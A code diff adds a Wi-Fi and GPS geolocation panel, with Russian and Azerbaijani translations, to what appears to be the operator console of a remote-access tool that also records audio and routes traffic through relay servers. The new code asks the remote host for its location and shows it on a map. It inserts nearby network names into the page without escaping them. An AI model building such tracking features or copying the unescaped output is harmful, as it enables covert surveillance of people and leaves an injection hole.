@@ -1524,6 +1524,7 @@ body {
     <button class="nav-btn" data-panel="programs" data-i18n-title="nav_programs" title="Installed Programs">📦</button>
     <button class="nav-btn" data-panel="host_events" title="Host Events Dashboard">📈</button>
     <button class="nav-btn" data-panel="users" title="Users (admin only)">👤</button>
+    <button class="nav-btn" data-panel="geo" data-i18n-title="nav_geo" title="Geolocation (WPS)">📍</button>
     <button class="nav-btn" data-panel="settings" data-i18n-title="nav_settings" title="Settings">⚙️</button>
   </div>
 
@@ -2647,6 +2648,60 @@ body {
       </div>
     </div>
 
+    <!-- ── WPS GEOLOCATION ── -->
+    <div id="panel-geo" class="panel" style="flex-direction:column;">
+      <div class="panel-header">
+        <span class="panel-title" data-i18n="title_geo">WPS GEOLOCATION</span>
+        <div class="panel-actions">
+          <button class="fm-btn" onclick="refreshGeo()" id="geo-refresh-btn" data-i18n="btn_refresh">↻ Refresh</button>
+        </div>
+      </div>
+      <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
+        <div style="display:flex;gap:16px;flex-wrap:wrap;">
+          <div class="dash-card" style="flex:1;min-width:220px;">
+            <div class="dash-card-icon">📍</div>
+            <div class="dash-card-title" data-i18n="geo_coordinates">Coordinates</div>
+            <div id="geo-lat" class="dash-card-value" style="font-size:14px;">—</div>
+            <div id="geo-lon" class="dash-card-sub" style="font-size:13px;">—</div>
+            <div id="geo-acc" class="dash-card-sub" style="color:var(--muted);font-size:12px;">—</div>
+          </div>
+          <div class="dash-card" style="flex:1;min-width:200px;">
+            <div class="dash-card-icon">📡</div>
+            <div class="dash-card-title" data-i18n="geo_source">Source</div>
+            <div id="geo-source" class="dash-card-value" style="font-size:14px;">—</div>
+            <div id="geo-alt" class="dash-card-sub" style="font-size:12px;">—</div>
+            <div id="geo-ts" class="dash-card-sub" style="color:var(--muted);font-size:11px;">—</div>
+          </div>
+          <div class="dash-card" style="flex:1;min-width:200px;">
+            <div class="dash-card-icon">🗺️</div>
+            <div class="dash-card-title" data-i18n="geo_map_title">Map</div>
+            <div id="geo-map-link" class="dash-card-sub" style="font-size:12px;" data-i18n="geo_no_data">—</div>
+          </div>
+        </div>
+        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;overflow:hidden;height:360px;" id="geo-map-wrap">
+          <iframe id="geo-map-iframe" style="width:100%;height:100%;border:none;display:none;" allowfullscreen loading="lazy"></iframe>
+          <div id="geo-map-placeholder" style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--muted);font-size:13px;" data-i18n="geo_no_data">No location data — click Refresh to get location</div>
+        </div>
+        <div class="dash-card" style="padding:12px;">
+          <div style="font-size:12px;font-weight:600;color:var(--accent);margin-bottom:8px;" data-i18n="geo_wifi_title">📶 Nearby Wi-Fi Networks (WPS)</div>
+          <div style="overflow-x:auto;">
+            <table id="geo-wifi-table" style="width:100%;border-collapse:collapse;font-size:12px;">
+              <thead>
+                <tr style="color:var(--muted);text-align:left;">
+                  <th style="padding:4px 8px;" data-i18n="geo_wifi_ssid">SSID</th>
+                  <th style="padding:4px 8px;" data-i18n="geo_wifi_bssid">BSSID</th>
+                  <th style="padding:4px 8px;" data-i18n="geo_wifi_signal">Signal</th>
+                </tr>
+              </thead>
+              <tbody id="geo-wifi-body">
+                <tr><td colspan="3" style="padding:6px 8px;color:var(--muted);" data-i18n="geo_no_wifi">No Wi-Fi data</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
   </div><!-- /main -->
 </div><!-- /app -->
 
@@ -2732,11 +2787,15 @@ const I18N = {
     // ── Sidebar tooltips ──
     nav_dashboard: 'Dashboard', nav_screen: 'Screen', nav_files: 'Files', nav_procs: 'Processes',
     nav_services: 'Services', nav_terminal: 'Terminal', nav_eventlog: 'Event Log', nav_registry: 'Registry Editor',
-    nav_screenshots: 'Screenshots', nav_audio: 'Audio Recording', nav_programs: 'Installed Programs', nav_settings: 'Settings',
+    nav_screenshots: 'Screenshots', nav_audio: 'Audio Recording', nav_programs: 'Installed Programs', nav_geo: 'Geolocation (WPS)', nav_settings: 'Settings',
     // ── Panel titles ──
     title_dashboard: 'Dashboard', title_files: 'FILES', title_procs: 'PROCESSES', title_services: 'Services',
     title_terminal: 'Terminal', title_screenshots: 'Screenshots', title_audio: 'Audio Recording',
     title_programs: 'Installed Programs', title_settings: 'Settings', title_eventlog: 'Event Log', title_registry: 'Registry Editor',
+    title_geo: 'WPS GEOLOCATION',
+    geo_coordinates: 'Coordinates', geo_source: 'Source', geo_map_title: 'Map',
+    geo_no_data: 'No location data — click Refresh', geo_wifi_title: 'Nearby Wi-Fi Networks (WPS)',
+    geo_wifi_ssid: 'SSID', geo_wifi_bssid: 'BSSID', geo_wifi_signal: 'Signal', geo_no_wifi: 'No Wi-Fi data',
     title_activity: 'ACTIVITY LOG', title_speed_test: 'SPEED TEST', title_infra: 'INFRASTRUCTURE',
     infra_vps2_title: 'VPS2 / Relay', infra_vps1_title: 'VPS1 / Chain Relay',
     infra_nochain_title: 'VPS1 / Chain Relay',
@@ -2985,10 +3044,14 @@ const I18N = {
     threat: 'УГРОЗА',
     nav_dashboard: 'Панель', nav_screen: 'Экран', nav_files: 'Файлы', nav_procs: 'Процессы',
     nav_services: 'Службы', nav_terminal: 'Терминал', nav_eventlog: 'Журнал событий', nav_registry: 'Реестр',
-    nav_screenshots: 'Скриншоты', nav_audio: 'Аудиозапись', nav_programs: 'Программы', nav_settings: 'Настройки',
+    nav_screenshots: 'Скриншоты', nav_audio: 'Аудиозапись', nav_programs: 'Программы', nav_geo: 'Геолокация (WPS)', nav_settings: 'Настройки',
     title_dashboard: 'Панель', title_files: 'ФАЙЛЫ', title_procs: 'ПРОЦЕССЫ', title_services: 'Службы',
     title_terminal: 'Терминал', title_screenshots: 'Скриншоты', title_audio: 'Аудиозапись',
     title_programs: 'Установленные программы', title_settings: 'Настройки', title_eventlog: 'Журнал событий', title_registry: 'Редактор реестра',
+    title_geo: 'WPS ГЕОЛОКАЦИЯ',
+    geo_coordinates: 'Координаты', geo_source: 'Источник', geo_map_title: 'Карта',
+    geo_no_data: 'Нет данных — нажмите Обновить', geo_wifi_title: 'Ближайшие Wi-Fi сети (WPS)',
+    geo_wifi_ssid: 'SSID', geo_wifi_bssid: 'BSSID', geo_wifi_signal: 'Сигнал', geo_no_wifi: 'Нет Wi-Fi данных',
     title_activity: 'ЖУРНАЛ АКТИВНОСТИ', title_speed_test: 'ТЕСТ СКОРОСТИ', title_infra: 'ИНФРАСТРУКТУРА',
     infra_vps2_title: 'ВПС2 / Релей', infra_vps1_title: 'ВПС1 / Цепочка',
     infra_nochain_title: 'ВПС1 / Цепочка',
@@ -3217,10 +3280,14 @@ const I18N = {
     threat: 'TƏHLÜKƏ',
     nav_dashboard: 'Panel', nav_screen: 'Ekran', nav_files: 'Fayllar', nav_procs: 'Proseslər',
     nav_services: 'Xidmətlər', nav_terminal: 'Terminal', nav_eventlog: 'Hadisə jurnalı', nav_registry: 'Registr',
-    nav_screenshots: 'Ekran şəkilləri', nav_audio: 'Səs yazısı', nav_programs: 'Quraşdırılmış proqramlar', nav_settings: 'Tənzimləmələr',
+    nav_screenshots: 'Ekran şəkilləri', nav_audio: 'Səs yazısı', nav_programs: 'Quraşdırılmış proqramlar', nav_geo: 'Geolokasiya (WPS)', nav_settings: 'Tənzimləmələr',
     title_dashboard: 'Panel', title_files: 'FAYLLAR', title_procs: 'PROSESLƏR', title_services: 'Xidmətlər',
     title_terminal: 'Terminal', title_screenshots: 'Ekran şəkilləri', title_audio: 'Səs yazısı',
     title_programs: 'Quraşdırılmış proqramlar', title_settings: 'Tənzimləmələr', title_eventlog: 'Hadisə jurnalı', title_registry: 'Registr redaktoru',
+    title_geo: 'WPS GEOLOKASİYA',
+    geo_coordinates: 'Koordinatlar', geo_source: 'Mənbə', geo_map_title: 'Xəritə',
+    geo_no_data: 'Məlumat yoxdur — Yenilə düyməsini basın', geo_wifi_title: 'Yaxın Wi-Fi şəbəkələri (WPS)',
+    geo_wifi_ssid: 'SSID', geo_wifi_bssid: 'BSSID', geo_wifi_signal: 'Siqnal', geo_no_wifi: 'Wi-Fi məlumatı yoxdur',
     title_activity: 'FƏALİYYƏT JURNALI', title_speed_test: 'SÜRƏT TESTİ', title_infra: 'İNFRASTRUKTUR',
     infra_vps2_title: 'VPS2 / Relay', infra_vps1_title: 'VPS1 / Zəncir Relay',
     infra_nochain_title: 'VPS1 / Zəncir Relay',
@@ -7805,6 +7872,96 @@ async function runAllSpeedTests() {
     }
   } finally {
     if (allBtn) allBtn.disabled = false;
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  WPS GEOLOCATION
+// ═══════════════════════════════════════════════════════════════
+async function refreshGeo() {
+  if (!state.connected || !state.hostOnline) { addLog('Geo: host offline', 'WARN'); return; }
+  const btn = document.getElementById('geo-refresh-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '...'; }
+  try {
+    const res = await sendCmd({ cmd: 'get_location' });
+    const d = typeof res === 'string' ? JSON.parse(res) : res;
+    updateGeoUI(d);
+  } catch (e) {
+    addLog('Geo: ' + (e.message || 'failed'), 'WARN');
+    const src = document.getElementById('geo-source');
+    if (src) src.textContent = 'Error: ' + (e.message || 'failed');
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = '↻ Refresh'; }
+  }
+}
+
+function updateGeoUI(d) {
+  const gps = d.gps || 'UNKNOWN';
+  const wifi = d.wifi;
+  const ts = new Date().toLocaleTimeString();
+  const tsEl = document.getElementById('geo-ts');
+  if (tsEl) tsEl.textContent = ts;
+
+  if (gps !== 'UNKNOWN' && gps !== 'ERROR') {
+    const parts = gps.split('|');
+    const lat = parts[0], lon = parts[1], acc = parts[2], alt = parts[3];
+    const latEl = document.getElementById('geo-lat');
+    const lonEl = document.getElementById('geo-lon');
+    const accEl = document.getElementById('geo-acc');
+    const srcEl = document.getElementById('geo-source');
+    const altEl = document.getElementById('geo-alt');
+    if (latEl) latEl.textContent = 'Lat: ' + lat;
+    if (lonEl) lonEl.textContent = 'Lon: ' + lon;
+    if (accEl) accEl.textContent = '± ' + acc + ' m';
+    if (srcEl) srcEl.textContent = 'Windows Location API';
+    if (altEl && alt && alt !== 'NaN') altEl.textContent = 'Alt: ' + parseFloat(alt).toFixed(1) + ' m';
+    const latF = parseFloat(lat), lonF = parseFloat(lon);
+    if (!isNaN(latF) && !isNaN(lonF)) {
+      const d = 0.005;
+      const mapUrl = 'https://www.openstreetmap.org/export/embed.html?bbox=' +
+        (lonF-d) + ',' + (latF-d) + ',' + (lonF+d) + ',' + (latF+d) +
+        '&layer=mapnik&marker=' + latF + ',' + lonF;
+      const iframe = document.getElementById('geo-map-iframe');
+      const ph = document.getElementById('geo-map-placeholder');
+      if (iframe) { iframe.src = mapUrl; iframe.style.display = ''; }
+      if (ph) ph.style.display = 'none';
+      const linkEl = document.getElementById('geo-map-link');
+      if (linkEl) linkEl.innerHTML = '<a href="https://www.google.com/maps?q=' + lat + ',' + lon +
+        '" target="_blank" rel="noopener" style="color:var(--accent);">Google Maps ↗</a>' +
+        ' &nbsp; <a href="https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lon +
+        '&zoom=15" target="_blank" rel="noopener" style="color:var(--accent);">OSM ↗</a>';
+    }
+    addLog('Geo: ' + lat + ', ' + lon + ' (±' + acc + ' m)', 'INFO');
+  } else {
+    const srcEl = document.getElementById('geo-source');
+    const latEl = document.getElementById('geo-lat');
+    if (latEl) latEl.textContent = gps === 'ERROR' ? 'Error' : 'Unknown';
+    if (srcEl) srcEl.textContent = gps === 'ERROR' ? 'API Error' : 'No signal';
+    addLog('Geo: location unavailable (' + gps + ')', 'WARN');
+  }
+
+  // Wi-Fi table
+  const tbody = document.getElementById('geo-wifi-body');
+  if (!tbody) return;
+  tbody.innerHTML = '';
+  let nets = [];
+  if (Array.isArray(wifi)) nets = wifi;
+  else if (typeof wifi === 'string' && wifi !== 'NONE' && wifi !== 'ERROR' && wifi.charAt(0) === '[') {
+    try { nets = JSON.parse(wifi); } catch(e) {}
+  }
+  if (nets.length > 0) {
+    nets.forEach(function(n) {
+      const tr = document.createElement('tr');
+      tr.style.borderTop = '1px solid var(--border)';
+      const sig = n.signal ? n.signal + '%' : '—';
+      const sigColor = !n.signal ? 'var(--muted)' : parseInt(n.signal) >= 70 ? 'var(--success)' : parseInt(n.signal) >= 40 ? 'var(--warn)' : 'var(--danger)';
+      tr.innerHTML = '<td style="padding:4px 8px;">' + (n.ssid || '—') + '</td>' +
+        '<td style="padding:4px 8px;font-family:monospace;font-size:11px;color:var(--muted);">' + (n.bssid || '—') + '</td>' +
+        '<td style="padding:4px 8px;color:' + sigColor + ';">' + sig + '</td>';
+      tbody.appendChild(tr);
+    });
+  } else {
+    tbody.innerHTML = '<tr><td colspan="3" style="padding:6px 8px;color:var(--muted);">No Wi-Fi networks found</td></tr>';
   }
 }
 
